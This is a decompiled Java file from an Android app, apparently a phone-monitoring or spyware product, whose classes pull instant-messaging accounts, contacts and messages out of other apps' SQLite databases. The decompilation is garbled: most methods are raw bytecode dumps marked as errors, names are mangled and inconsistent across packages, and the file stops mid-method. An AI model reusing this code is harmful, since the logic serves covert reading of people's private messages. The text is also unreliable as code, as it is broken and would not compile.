package com.vvt.capture.b.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.ConditionVariable;
import android.os.SystemClock;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.im.events.info.f;
import com.vvt.im.events.store.StringEventKeys;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.io.Serializable;
import java.net.URI;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private static final String[] d;
  private static boolean e;
  
  static
  {
    String[] arrayOfString = new String[2];
    arrayOfString[0] = "key";
    arrayOfString[1] = "value";
    d = arrayOfString;
  }
  
  private static int a(int paramInt, String paramString, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3)
  {
    MessageType localMessageType = MessageType.none;
    int i = localMessageType.getNumber();
    if (paramBoolean2)
    {
      localMessageType = MessageType.Sticker;
      i = localMessageType.getNumber();
    }
    for (;;)
    {
      return i;
      if (paramBoolean1)
      {
        if (paramString != null)
        {
          i = paramString.length();
          if (i > 0)
          {
            localMessageType = MessageType.Text;
            i = localMessageType.getNumber();
            continue;
          }
        }
        localMessageType = MessageType.none;
        i = localMessageType.getNumber();
      }
      else if (paramBoolean3)
      {
        localMessageType = MessageType.ShareLocation;
        i = localMessageType.getNumber();
      }
      else if (paramString != null)
      {
        int j = paramString.length();
        if (j > 0)
        {
          localMessageType = MessageType.Text;
          i = localMessageType.getNumber();
        }
      }
    }
  }
  
  /* Error */
  private static com.vvt.capture.b.d a(int paramInt, SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aload_1
    //   3: ifnull +331 -> 334
    //   6: iconst_m1
    //   7: istore 4
    //   9: iload_0
    //   10: iload 4
    //   12: if_icmpne +7 -> 19
    //   15: iconst_m1
    //   16: iconst_1
    //   17: iushr
    //   18: istore_0
    //   19: invokestatic 58	com/vvt/capture/removeFromPath/a/a:e	()Ljava/lang/String;
    //   22: astore 5
    //   24: iconst_2
    //   25: istore 6
    //   27: iload 6
    //   29: anewarray 26	java/lang/String
    //   32: astore 7
    //   34: iconst_0
    //   35: istore 8
    //   37: aconst_null
    //   38: astore 9
    //   40: aconst_null
    //   41: astore 10
    //   43: iconst_0
    //   44: invokestatic 64	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   47: astore 10
    //   49: aload 7
    //   51: iconst_0
    //   52: aload 10
    //   54: aastore
    //   55: iconst_1
    //   56: istore 8
    //   58: iload_0
    //   59: invokestatic 64	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   62: astore 10
    //   64: aload 7
    //   66: iload 8
    //   68: aload 10
    //   70: aastore
    //   71: aload_1
    //   72: aload 5
    //   74: aload 7
    //   76: invokevirtual 70	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   79: astore 7
    //   81: aload 7
    //   83: invokeinterface 76 1 0
    //   88: istore 4
    //   90: iload 4
    //   92: ifeq +233 -> 325
    //   95: ldc 78
    //   97: astore 5
    //   99: aload 7
    //   101: aload 5
    //   103: invokeinterface 82 2 0
    //   108: istore 4
    //   110: aload 7
    //   112: iload 4
    //   114: invokeinterface 85 2 0
    //   119: astore 9
    //   121: ldc 87
    //   123: astore 5
    //   125: aload 7
    //   127: aload 5
    //   129: invokeinterface 82 2 0
    //   134: istore 4
    //   136: aload 7
    //   138: iload 4
    //   140: invokeinterface 91 2 0
    //   145: lstore 11
    //   147: ldc 93
    //   149: astore 5
    //   151: aload 7
    //   153: aload 5
    //   155: invokeinterface 82 2 0
    //   160: istore 4
    //   162: aload 7
    //   164: iload 4
    //   166: invokeinterface 85 2 0
    //   171: astore 13
    //   173: new 95	com/vvt/capture/removeFromPath/d
    //   176: astore 5
    //   178: aload 5
    //   180: invokespecial 99	com/vvt/capture/removeFromPath/d:<init>	()V
    //   183: aload 5
    //   185: aload 9
    //   187: invokevirtual 102	com/vvt/capture/removeFromPath/d:a	(Ljava/lang/String;)V
    //   190: aload 5
    //   192: aload 13
    //   194: invokevirtual 104	com/vvt/capture/removeFromPath/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   197: aload 5
    //   199: lload 11
    //   201: invokevirtual 107	com/vvt/capture/removeFromPath/d:removeFromPath	(J)V
    //   204: aload 5
    //   206: aload_2
    //   207: invokevirtual 109	com/vvt/capture/removeFromPath/d:e	(Ljava/lang/String;)V
    //   210: aload 7
    //   212: ifnull +10 -> 222
    //   215: aload 7
    //   217: invokeinterface 112 1 0
    //   222: aload 7
    //   224: ifnull +10 -> 234
    //   227: aload 7
    //   229: invokeinterface 112 1 0
    //   234: aload 5
    //   236: areturn
    //   237: astore 5
    //   239: iconst_0
    //   240: istore 4
    //   242: aconst_null
    //   243: astore 5
    //   245: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   248: istore 6
    //   250: iload 6
    //   252: ifeq +3 -> 255
    //   255: aload_3
    //   256: ifnull -22 -> 234
    //   259: aload_3
    //   260: invokeinterface 112 1 0
    //   265: goto -31 -> 234
    //   268: astore 5
    //   270: iconst_0
    //   271: istore 6
    //   273: aconst_null
    //   274: astore 7
    //   276: aload 7
    //   278: ifnull +10 -> 288
    //   281: aload 7
    //   283: invokeinterface 112 1 0
    //   288: aload 5
    //   290: athrow
    //   291: astore 5
    //   293: goto -17 -> 276
    //   296: astore 5
    //   298: aload_3
    //   299: astore 7
    //   301: goto -25 -> 276
    //   304: astore 5
    //   306: iconst_0
    //   307: istore 4
    //   309: aconst_null
    //   310: astore 5
    //   312: aload 7
    //   314: astore_3
    //   315: goto -70 -> 245
    //   318: astore_3
    //   319: aload 7
    //   321: astore_3
    //   322: goto -77 -> 245
    //   325: iconst_0
    //   326: istore 4
    //   328: aconst_null
    //   329: astore 5
    //   331: goto -121 -> 210
    //   334: iconst_0
    //   335: istore 4
    //   337: aconst_null
    //   338: astore 5
    //   340: iconst_0
    //   341: istore 6
    //   343: aconst_null
    //   344: astore 7
    //   346: goto -124 -> 222
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	349	0	paramInt	int
    //   0	349	1	paramSQLiteDatabase	SQLiteDatabase
    //   0	349	2	paramString	String
    //   1	314	3	localObject1	Object
    //   318	1	3	localException1	Exception
    //   321	1	3	localObject2	Object
    //   7	6	4	i	int
    //   88	3	4	bool1	boolean
    //   108	228	4	j	int
    //   22	213	5	localObject3	Object
    //   237	1	5	localException2	Exception
    //   243	1	5	localObject4	Object
    //   268	21	5	localObject5	Object
    //   291	1	5	localObject6	Object
    //   296	1	5	localObject7	Object
    //   304	1	5	localException3	Exception
    //   310	29	5	localObject8	Object
    //   25	3	6	k	int
    //   248	94	6	bool2	boolean
    //   32	313	7	localObject9	Object
    //   35	32	8	m	int
    //   38	148	9	str1	String
    //   41	28	10	str2	String
    //   145	55	11	l	long
    //   171	22	13	str3	String
    // Exception table:
    //   from	to	target	type
    //   19	22	237	java/lang/Exception
    //   27	32	237	java/lang/Exception
    //   43	47	237	java/lang/Exception
    //   52	55	237	java/lang/Exception
    //   58	62	237	java/lang/Exception
    //   68	71	237	java/lang/Exception
    //   74	79	237	java/lang/Exception
    //   19	22	268	finally
    //   27	32	268	finally
    //   43	47	268	finally
    //   52	55	268	finally
    //   58	62	268	finally
    //   68	71	268	finally
    //   74	79	268	finally
    //   81	88	291	finally
    //   101	108	291	finally
    //   112	119	291	finally
    //   127	134	291	finally
    //   138	145	291	finally
    //   153	160	291	finally
    //   164	171	291	finally
    //   173	176	291	finally
    //   178	183	291	finally
    //   185	190	291	finally
    //   192	197	291	finally
    //   199	204	291	finally
    //   206	210	291	finally
    //   215	222	291	finally
    //   245	248	296	finally
    //   81	88	304	java/lang/Exception
    //   101	108	304	java/lang/Exception
    //   112	119	304	java/lang/Exception
    //   127	134	304	java/lang/Exception
    //   138	145	304	java/lang/Exception
    //   153	160	304	java/lang/Exception
    //   164	171	304	java/lang/Exception
    //   173	176	304	java/lang/Exception
    //   178	183	304	java/lang/Exception
    //   185	190	318	java/lang/Exception
    //   192	197	318	java/lang/Exception
    //   199	204	318	java/lang/Exception
    //   206	210	318	java/lang/Exception
    //   215	222	318	java/lang/Exception
  }
  
  /* Error */
  public static com.vvt.capture.b.d a(int paramInt, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   5: istore 4
    //   7: iload 4
    //   9: ifeq +3 -> 12
    //   12: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   15: istore 4
    //   17: iload 4
    //   19: ifeq +3 -> 22
    //   22: aload_1
    //   23: invokestatic 119	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   26: istore 4
    //   28: iload 4
    //   30: ifne +297 -> 327
    //   33: bipush 17
    //   35: istore 4
    //   37: iload 4
    //   39: aload_1
    //   40: invokestatic 125	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   43: astore 5
    //   45: aload 5
    //   47: ifnull +271 -> 318
    //   50: ldc 127
    //   52: astore 6
    //   54: iload_0
    //   55: aload 5
    //   57: aload 6
    //   59: invokestatic 130	com/vvt/capture/removeFromPath/a/a:a	(ILandroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Lcom/vvt/capture/removeFromPath/d;
    //   62: astore 6
    //   64: aload 5
    //   66: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   69: aload_2
    //   70: invokestatic 119	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   73: istore 7
    //   75: iload 7
    //   77: ifne +225 -> 302
    //   80: bipush 17
    //   82: istore 7
    //   84: iload 7
    //   86: aload_2
    //   87: invokestatic 125	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   90: astore 5
    //   92: aload 5
    //   94: ifnull +208 -> 302
    //   97: ldc -123
    //   99: astore 8
    //   101: iload_0
    //   102: aload 5
    //   104: aload 8
    //   106: invokestatic 130	com/vvt/capture/removeFromPath/a/a:a	(ILandroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Lcom/vvt/capture/removeFromPath/d;
    //   109: astore_3
    //   110: aload 5
    //   112: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   115: aload 5
    //   117: astore 9
    //   119: aload_3
    //   120: astore 5
    //   122: aload 9
    //   124: astore_3
    //   125: aload_3
    //   126: ifnull +7 -> 133
    //   129: aload_3
    //   130: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   133: aload 6
    //   135: aload 5
    //   137: invokestatic 136	com/vvt/capture/removeFromPath/a/a:a	(Lcom/vvt/capture/removeFromPath/d;Lcom/vvt/capture/removeFromPath/d;)Lcom/vvt/capture/removeFromPath/d;
    //   140: astore 5
    //   142: aload 5
    //   144: ifnull +33 -> 177
    //   147: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   150: istore 10
    //   152: iload 10
    //   154: ifeq +3 -> 157
    //   157: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   160: istore 10
    //   162: iload 10
    //   164: ifeq +3 -> 167
    //   167: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   170: istore 10
    //   172: iload 10
    //   174: ifeq +3 -> 177
    //   177: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   180: istore 10
    //   182: iload 10
    //   184: ifeq +3 -> 187
    //   187: aload 5
    //   189: areturn
    //   190: astore 5
    //   192: iconst_0
    //   193: istore 4
    //   195: aconst_null
    //   196: astore 5
    //   198: iconst_0
    //   199: istore 10
    //   201: aconst_null
    //   202: astore 6
    //   204: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   207: istore 7
    //   209: iload 7
    //   211: ifeq +3 -> 214
    //   214: aload_3
    //   215: ifnull -82 -> 133
    //   218: goto -89 -> 129
    //   221: astore 5
    //   223: aload_3
    //   224: ifnull +7 -> 231
    //   227: aload_3
    //   228: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   231: aload 5
    //   233: athrow
    //   234: astore 6
    //   236: aload 5
    //   238: astore_3
    //   239: aload 6
    //   241: astore 5
    //   243: goto -20 -> 223
    //   246: astore 6
    //   248: iconst_0
    //   249: istore 10
    //   251: aconst_null
    //   252: astore 6
    //   254: aconst_null
    //   255: astore 9
    //   257: aload 5
    //   259: astore_3
    //   260: iconst_0
    //   261: istore 4
    //   263: aconst_null
    //   264: astore 5
    //   266: goto -62 -> 204
    //   269: astore 8
    //   271: aload 5
    //   273: astore 9
    //   275: iconst_0
    //   276: istore 4
    //   278: aconst_null
    //   279: astore 5
    //   281: aload 9
    //   283: astore_3
    //   284: goto -80 -> 204
    //   287: astore 8
    //   289: aload 5
    //   291: astore 9
    //   293: aload_3
    //   294: astore 5
    //   296: aload 9
    //   298: astore_3
    //   299: goto -95 -> 204
    //   302: aload 5
    //   304: astore 9
    //   306: iconst_0
    //   307: istore 4
    //   309: aconst_null
    //   310: astore 5
    //   312: aload 9
    //   314: astore_3
    //   315: goto -190 -> 125
    //   318: iconst_0
    //   319: istore 10
    //   321: aconst_null
    //   322: astore 6
    //   324: goto -255 -> 69
    //   327: iconst_0
    //   328: istore 4
    //   330: aconst_null
    //   331: astore 5
    //   333: iconst_0
    //   334: istore 10
    //   336: aconst_null
    //   337: astore 6
    //   339: goto -270 -> 69
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	342	0	paramInt	int
    //   0	342	1	paramString1	String
    //   0	342	2	paramString2	String
    //   1	314	3	localObject1	Object
    //   5	24	4	bool1	boolean
    //   35	294	4	i	int
    //   43	145	5	localObject2	Object
    //   190	1	5	localException1	Exception
    //   196	1	5	localObject3	Object
    //   221	16	5	localObject4	Object
    //   241	91	5	localObject5	Object
    //   52	151	6	localObject6	Object
    //   234	6	6	localObject7	Object
    //   246	1	6	localException2	Exception
    //   252	86	6	localObject8	Object
    //   73	3	7	bool2	boolean
    //   82	3	7	j	int
    //   207	3	7	bool3	boolean
    //   99	6	8	str	String
    //   269	1	8	localException3	Exception
    //   287	1	8	localException4	Exception
    //   117	196	9	localObject9	Object
    //   150	185	10	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   22	26	190	java/lang/Exception
    //   39	43	190	java/lang/Exception
    //   22	26	221	finally
    //   39	43	221	finally
    //   204	207	221	finally
    //   57	62	234	finally
    //   64	69	234	finally
    //   69	73	234	finally
    //   86	90	234	finally
    //   104	109	234	finally
    //   110	115	234	finally
    //   57	62	246	java/lang/Exception
    //   64	69	269	java/lang/Exception
    //   69	73	269	java/lang/Exception
    //   86	90	269	java/lang/Exception
    //   104	109	269	java/lang/Exception
    //   110	115	287	java/lang/Exception
  }
  
  /* Error */
  private static com.vvt.capture.b.d a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: aload_0
    //   3: ifnull +301 -> 304
    //   6: invokestatic 58	com/vvt/capture/removeFromPath/a/a:e	()Ljava/lang/String;
    //   9: astore_3
    //   10: iconst_2
    //   11: istore 4
    //   13: iload 4
    //   15: anewarray 26	java/lang/String
    //   18: astore 5
    //   20: iconst_0
    //   21: istore 6
    //   23: aconst_null
    //   24: astore 7
    //   26: iconst_0
    //   27: istore 8
    //   29: aconst_null
    //   30: astore 9
    //   32: iconst_0
    //   33: invokestatic 64	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   36: astore 9
    //   38: aload 5
    //   40: iconst_0
    //   41: aload 9
    //   43: aastore
    //   44: iconst_1
    //   45: istore 6
    //   47: iconst_1
    //   48: istore 8
    //   50: iload 8
    //   52: invokestatic 64	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   55: astore 9
    //   57: aload 5
    //   59: iload 6
    //   61: aload 9
    //   63: aastore
    //   64: aload_0
    //   65: aload_3
    //   66: aload 5
    //   68: invokevirtual 70	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   71: astore 5
    //   73: aload 5
    //   75: invokeinterface 139 1 0
    //   80: istore 10
    //   82: iload 10
    //   84: ifeq +212 -> 296
    //   87: ldc 78
    //   89: astore_3
    //   90: aload 5
    //   92: aload_3
    //   93: invokeinterface 82 2 0
    //   98: istore 10
    //   100: aload 5
    //   102: iload 10
    //   104: invokeinterface 85 2 0
    //   109: astore 7
    //   111: ldc 87
    //   113: astore_3
    //   114: aload 5
    //   116: aload_3
    //   117: invokeinterface 82 2 0
    //   122: istore 10
    //   124: aload 5
    //   126: iload 10
    //   128: invokeinterface 91 2 0
    //   133: lstore 11
    //   135: ldc 93
    //   137: astore_3
    //   138: aload 5
    //   140: aload_3
    //   141: invokeinterface 82 2 0
    //   146: istore 10
    //   148: aload 5
    //   150: iload 10
    //   152: invokeinterface 85 2 0
    //   157: astore 13
    //   159: new 95	com/vvt/capture/removeFromPath/d
    //   162: astore_3
    //   163: aload_3
    //   164: invokespecial 99	com/vvt/capture/removeFromPath/d:<init>	()V
    //   167: aload_3
    //   168: aload 7
    //   170: invokevirtual 102	com/vvt/capture/removeFromPath/d:a	(Ljava/lang/String;)V
    //   173: aload_3
    //   174: aload 13
    //   176: invokevirtual 104	com/vvt/capture/removeFromPath/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   179: aload_3
    //   180: lload 11
    //   182: invokevirtual 107	com/vvt/capture/removeFromPath/d:removeFromPath	(J)V
    //   185: aload_3
    //   186: aload_1
    //   187: invokevirtual 109	com/vvt/capture/removeFromPath/d:e	(Ljava/lang/String;)V
    //   190: aload 5
    //   192: ifnull +10 -> 202
    //   195: aload 5
    //   197: invokeinterface 112 1 0
    //   202: aload 5
    //   204: ifnull +10 -> 214
    //   207: aload 5
    //   209: invokeinterface 112 1 0
    //   214: aload_3
    //   215: areturn
    //   216: astore_3
    //   217: iconst_0
    //   218: istore 10
    //   220: aconst_null
    //   221: astore_3
    //   222: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   225: istore 4
    //   227: iload 4
    //   229: ifeq +3 -> 232
    //   232: aload_2
    //   233: ifnull -19 -> 214
    //   236: aload_2
    //   237: invokeinterface 112 1 0
    //   242: goto -28 -> 214
    //   245: astore_3
    //   246: iconst_0
    //   247: istore 4
    //   249: aconst_null
    //   250: astore 5
    //   252: aload 5
    //   254: ifnull +10 -> 264
    //   257: aload 5
    //   259: invokeinterface 112 1 0
    //   264: aload_3
    //   265: athrow
    //   266: astore_3
    //   267: goto -15 -> 252
    //   270: astore_3
    //   271: aload_2
    //   272: astore 5
    //   274: goto -22 -> 252
    //   277: astore_3
    //   278: iconst_0
    //   279: istore 10
    //   281: aconst_null
    //   282: astore_3
    //   283: aload 5
    //   285: astore_2
    //   286: goto -64 -> 222
    //   289: astore_2
    //   290: aload 5
    //   292: astore_2
    //   293: goto -71 -> 222
    //   296: iconst_0
    //   297: istore 10
    //   299: aconst_null
    //   300: astore_3
    //   301: goto -111 -> 190
    //   304: iconst_0
    //   305: istore 10
    //   307: aconst_null
    //   308: astore_3
    //   309: iconst_0
    //   310: istore 4
    //   312: aconst_null
    //   313: astore 5
    //   315: goto -113 -> 202
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	318	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	318	1	paramString	String
    //   1	285	2	localObject1	Object
    //   289	1	2	localException1	Exception
    //   292	1	2	localObject2	Object
    //   9	206	3	localObject3	Object
    //   216	1	3	localException2	Exception
    //   221	1	3	localObject4	Object
    //   245	20	3	localObject5	Object
    //   266	1	3	localObject6	Object
    //   270	1	3	localObject7	Object
    //   277	1	3	localException3	Exception
    //   282	27	3	localObject8	Object
    //   11	3	4	i	int
    //   225	86	4	bool1	boolean
    //   18	296	5	localObject9	Object
    //   21	39	6	j	int
    //   24	145	7	str1	String
    //   27	24	8	k	int
    //   30	32	9	str2	String
    //   80	3	10	bool2	boolean
    //   98	208	10	m	int
    //   133	48	11	l	long
    //   157	18	13	str3	String
    // Exception table:
    //   from	to	target	type
    //   6	9	216	java/lang/Exception
    //   13	18	216	java/lang/Exception
    //   32	36	216	java/lang/Exception
    //   41	44	216	java/lang/Exception
    //   50	55	216	java/lang/Exception
    //   61	64	216	java/lang/Exception
    //   66	71	216	java/lang/Exception
    //   6	9	245	finally
    //   13	18	245	finally
    //   32	36	245	finally
    //   41	44	245	finally
    //   50	55	245	finally
    //   61	64	245	finally
    //   66	71	245	finally
    //   73	80	266	finally
    //   92	98	266	finally
    //   102	109	266	finally
    //   116	122	266	finally
    //   126	133	266	finally
    //   140	146	266	finally
    //   150	157	266	finally
    //   159	162	266	finally
    //   163	167	266	finally
    //   168	173	266	finally
    //   174	179	266	finally
    //   180	185	266	finally
    //   186	190	266	finally
    //   195	202	266	finally
    //   222	225	270	finally
    //   73	80	277	java/lang/Exception
    //   92	98	277	java/lang/Exception
    //   102	109	277	java/lang/Exception
    //   116	122	277	java/lang/Exception
    //   126	133	277	java/lang/Exception
    //   140	146	277	java/lang/Exception
    //   150	157	277	java/lang/Exception
    //   159	162	277	java/lang/Exception
    //   163	167	277	java/lang/Exception
    //   168	173	289	java/lang/Exception
    //   174	179	289	java/lang/Exception
    //   180	185	289	java/lang/Exception
    //   186	190	289	java/lang/Exception
    //   195	202	289	java/lang/Exception
  }
  
  private static com.vvt.capture.b.d a(com.vvt.capture.b.d paramd1, com.vvt.capture.b.d paramd2)
  {
    if (paramd1 == null) {
      if (paramd2 == null) {
        paramd2 = null;
      }
    }
    for (;;)
    {
      return paramd2;
      if (paramd2 == null)
      {
        paramd2 = paramd1;
      }
      else
      {
        long l1 = paramd1.h();
        long l2 = paramd2.h();
        boolean bool = l1 < l2;
        if (bool) {
          paramd2 = paramd1;
        }
      }
    }
  }
  
  /* Error */
  public static com.vvt.capture.b.d a(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   13: istore_3
    //   14: iload_3
    //   15: ifeq +3 -> 18
    //   18: aload_0
    //   19: invokestatic 119	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   22: istore_3
    //   23: iload_3
    //   24: ifne +289 -> 313
    //   27: bipush 17
    //   29: istore_3
    //   30: iload_3
    //   31: aload_0
    //   32: invokestatic 125	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   35: astore 4
    //   37: aload 4
    //   39: ifnull +265 -> 304
    //   42: ldc 127
    //   44: astore 5
    //   46: aload 4
    //   48: aload 5
    //   50: invokestatic 146	com/vvt/capture/removeFromPath/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Lcom/vvt/capture/removeFromPath/d;
    //   53: astore 5
    //   55: aload 4
    //   57: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   60: aload_1
    //   61: invokestatic 119	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   64: istore 6
    //   66: iload 6
    //   68: ifne +221 -> 289
    //   71: bipush 17
    //   73: istore 6
    //   75: iload 6
    //   77: aload_1
    //   78: invokestatic 125	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   81: astore 4
    //   83: aload 4
    //   85: ifnull +204 -> 289
    //   88: ldc -123
    //   90: astore 7
    //   92: aload 4
    //   94: aload 7
    //   96: invokestatic 146	com/vvt/capture/removeFromPath/a/a:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Lcom/vvt/capture/removeFromPath/d;
    //   99: astore_2
    //   100: aload 4
    //   102: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   105: aload 4
    //   107: astore 8
    //   109: aload_2
    //   110: astore 4
    //   112: aload 8
    //   114: astore_2
    //   115: aload_2
    //   116: ifnull +7 -> 123
    //   119: aload_2
    //   120: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   123: aload 5
    //   125: aload 4
    //   127: invokestatic 136	com/vvt/capture/removeFromPath/a/a:a	(Lcom/vvt/capture/removeFromPath/d;Lcom/vvt/capture/removeFromPath/d;)Lcom/vvt/capture/removeFromPath/d;
    //   130: astore 4
    //   132: aload 4
    //   134: ifnull +33 -> 167
    //   137: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   140: istore 9
    //   142: iload 9
    //   144: ifeq +3 -> 147
    //   147: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   150: istore 9
    //   152: iload 9
    //   154: ifeq +3 -> 157
    //   157: getstatic 19	com/vvt/capture/removeFromPath/a/a:removeFromPath	Z
    //   160: istore 9
    //   162: iload 9
    //   164: ifeq +3 -> 167
    //   167: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   170: istore 9
    //   172: iload 9
    //   174: ifeq +3 -> 177
    //   177: aload 4
    //   179: areturn
    //   180: astore 4
    //   182: iconst_0
    //   183: istore_3
    //   184: aconst_null
    //   185: astore 4
    //   187: iconst_0
    //   188: istore 9
    //   190: aconst_null
    //   191: astore 5
    //   193: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   196: istore 6
    //   198: iload 6
    //   200: ifeq +3 -> 203
    //   203: aload_2
    //   204: ifnull -81 -> 123
    //   207: goto -88 -> 119
    //   210: astore 4
    //   212: aload_2
    //   213: ifnull +7 -> 220
    //   216: aload_2
    //   217: invokevirtual 131	android/database/sqlite/SQLiteDatabase:close	()V
    //   220: aload 4
    //   222: athrow
    //   223: astore 5
    //   225: aload 4
    //   227: astore_2
    //   228: aload 5
    //   230: astore 4
    //   232: goto -20 -> 212
    //   235: astore 5
    //   237: iconst_0
    //   238: istore 9
    //   240: aconst_null
    //   241: astore 5
    //   243: aconst_null
    //   244: astore 8
    //   246: aload 4
    //   248: astore_2
    //   249: iconst_0
    //   250: istore_3
    //   251: aconst_null
    //   252: astore 4
    //   254: goto -61 -> 193
    //   257: astore 7
    //   259: aload 4
    //   261: astore 8
    //   263: iconst_0
    //   264: istore_3
    //   265: aconst_null
    //   266: astore 4
    //   268: aload 8
    //   270: astore_2
    //   271: goto -78 -> 193
    //   274: astore 7
    //   276: aload 4
    //   278: astore 8
    //   280: aload_2
    //   281: astore 4
    //   283: aload 8
    //   285: astore_2
    //   286: goto -93 -> 193
    //   289: aload 4
    //   291: astore 8
    //   293: iconst_0
    //   294: istore_3
    //   295: aconst_null
    //   296: astore 4
    //   298: aload 8
    //   300: astore_2
    //   301: goto -186 -> 115
    //   304: iconst_0
    //   305: istore 9
    //   307: aconst_null
    //   308: astore 5
    //   310: goto -250 -> 60
    //   313: iconst_0
    //   314: istore_3
    //   315: aconst_null
    //   316: astore 4
    //   318: iconst_0
    //   319: istore 9
    //   321: aconst_null
    //   322: astore 5
    //   324: goto -264 -> 60
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	327	0	paramString1	String
    //   0	327	1	paramString2	String
    //   1	300	2	localObject1	Object
    //   5	19	3	bool1	boolean
    //   29	286	3	i	int
    //   35	143	4	localObject2	Object
    //   180	1	4	localException1	Exception
    //   185	1	4	localObject3	Object
    //   210	16	4	localObject4	Object
    //   230	87	4	localObject5	Object
    //   44	148	5	localObject6	Object
    //   223	6	5	localObject7	Object
    //   235	1	5	localException2	Exception
    //   241	82	5	localObject8	Object
    //   64	3	6	bool2	boolean
    //   73	3	6	j	int
    //   196	3	6	bool3	boolean
    //   90	5	7	str	String
    //   257	1	7	localException3	Exception
    //   274	1	7	localException4	Exception
    //   107	192	8	localObject9	Object
    //   140	180	9	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   18	22	180	java/lang/Exception
    //   31	35	180	java/lang/Exception
    //   18	22	210	finally
    //   31	35	210	finally
    //   193	196	210	finally
    //   48	53	223	finally
    //   55	60	223	finally
    //   60	64	223	finally
    //   77	81	223	finally
    //   94	99	223	finally
    //   100	105	223	finally
    //   48	53	235	java/lang/Exception
    //   55	60	257	java/lang/Exception
    //   60	64	257	java/lang/Exception
    //   77	81	257	java/lang/Exception
    //   94	99	257	java/lang/Exception
    //   100	105	274	java/lang/Exception
  }
  
  private static com.vvt.im.events.info.b a(String paramString1, boolean paramBoolean, String paramString2, String paramString3, List paramList)
  {
    if (!paramBoolean)
    {
      int i = paramList.size();
      if (i <= 0) {}
    }
    boolean bool = a;
    if (bool) {}
    com.vvt.im.events.info.b localb = new com/vvt/im/events/info/b;
